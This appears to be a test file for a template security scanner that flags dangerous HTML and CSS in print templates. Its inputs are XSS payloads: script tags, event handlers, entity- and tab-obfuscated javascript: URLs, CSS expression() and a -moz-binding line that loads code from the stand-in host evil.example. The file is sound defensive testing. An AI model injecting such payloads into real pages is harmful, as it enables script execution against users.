import test from "node:test";
import assert from "node:assert/strict";
import { analyzeTemplateSecurity } from "./ai-template-security.ts";

test("security: <script> is a blocking error", () => {
  const { errors } = analyzeTemplateSecurity(`<p>ok</p><script>alert(1)</script>`, "");
  assert.ok(errors.some((e) => e.code === "SCRIPT_TAG"));
});

test("security: inline event handler is a blocking error", () => {
  const { errors } = analyzeTemplateSecurity(`<div onclick="doBad()"><<Ho_ten>></div>`, "");
  assert.ok(errors.some((e) => e.code === "INLINE_EVENT_HANDLER"));
});

test("security: javascript: URL in an href is a blocking error", () => {
  const { errors } = analyzeTemplateSecurity(`<a href="javascript:alert(1)">link</a>`, "");
  assert.ok(errors.some((e) => e.code === "JAVASCRIPT_URL"));
});

test("security: javascript: URL survives whitespace/tab obfuscation", () => {
  const { errors } = analyzeTemplateSecurity(`<a href="java\tscript:alert(1)">link</a>`, "");
  assert.ok(errors.some((e) => e.code === "JAVASCRIPT_URL"));
});

test("security: javascript: URL survives numeric-entity obfuscation", () => {
  const { errors } = analyzeTemplateSecurity(`<a href="&#106;avascript:alert(1)">link</a>`, "");
  assert.ok(errors.some((e) => e.code === "JAVASCRIPT_URL"));
});

test("security: vbscript: URL is a blocking error", () => {
  const { errors } = analyzeTemplateSecurity(`<a href="vbscript:msgbox(1)">link</a>`, "");
  assert.ok(errors.some((e) => e.code === "VBSCRIPT_URL"));
});

test("security: iframe/object/embed are blocking errors", () => {
  for (const tag of ["iframe", "object", "embed"]) {
    const { errors } = analyzeTemplateSecurity(`<${tag} src="x"></${tag}>`, "");
    assert.ok(errors.some((e) => e.code === "UNSUPPORTED_EMBED"), `expected error for <${tag}>`);
  }
});

test("security: meta refresh is a warning, not an error (no effect in static print)", () => {
  const { errors, warnings } = analyzeTemplateSecurity(`<meta http-equiv="refresh" content="0;url=x">`, "");
  assert.equal(errors.length, 0);
  assert.ok(warnings.some((w) => w.code === "META_REFRESH"));
});

test("security: dangerous CSS url() is a blocking error", () => {
  const { errors } = analyzeTemplateSecurity("<div><<Anh>></div>", `.x { background: url(javascript:alert(1)); }`);
  assert.ok(errors.some((e) => e.code === "DANGEROUS_CSS_URL"));
});

test("security: CSS expression() is a blocking error", () => {
  const { errors } = analyzeTemplateSecurity("", `.x { width: expression(alert(1)); }`);
  assert.ok(errors.some((e) => e.code === "CSS_EXPRESSION"));
});

test("security: -moz-binding is a blocking error", () => {
  const { errors } = analyzeTemplateSecurity("", `.x { -moz-binding: url("http://evil.example/xbl.xml#exec"); }`);
  assert.ok(errors.some((e) => e.code === "MOZ_BINDING"));
});

test("security: @import is a warning (network blocked, not a bypass, but should be flagged)", () => {
  const { errors, warnings } = analyzeTemplateSecurity("", `@import url("https://example.com/x.css");`);
  assert.equal(errors.filter((e) => e.code !== "DANGEROUS_CSS_URL").length, 0);
  assert.ok(warnings.some((w) => w.code === "UNSAFE_CSS_IMPORT"));
});

test("security: ordinary safe template produces zero errors and zero warnings", () => {
  const html = `<div class="page"><table><tr><td><<Ho_ten>></td></tr></table></div>`;
  const css = `.page { width: 100%; } td { padding: 4px; }`;
  const { errors, warnings } = analyzeTemplateSecurity(html, css);
  assert.deepEqual(errors, []);
  assert.deepEqual(warnings, []);
});

test("security: placeholder text <<Ho_ten>> is never itself flagged as a tag/script", () => {
  const { errors, warnings } = analyzeTemplateSecurity(`<p><<Ho_ten>> <<Dia_chi_tam_tru>></p>`, "");
  assert.deepEqual(errors, []);
  assert.deepEqual(warnings, []);
});

test("security: event-like attribute name inside an ESCAPED candidate value is not a false positive", () => {
  // A merged candidate value that happens to contain literal text "onclick="
  // (already HTML-escaped by the renderer) must not trip the HTML scanner,
  // because it is text content, not a real attribute.
  const html = `<p>Ghi chú: &lt;div onclick=&quot;x&quot;&gt;</p>`;
  const { errors } = analyzeTemplateSecurity(html, "");
  assert.deepEqual(errors, []);
});
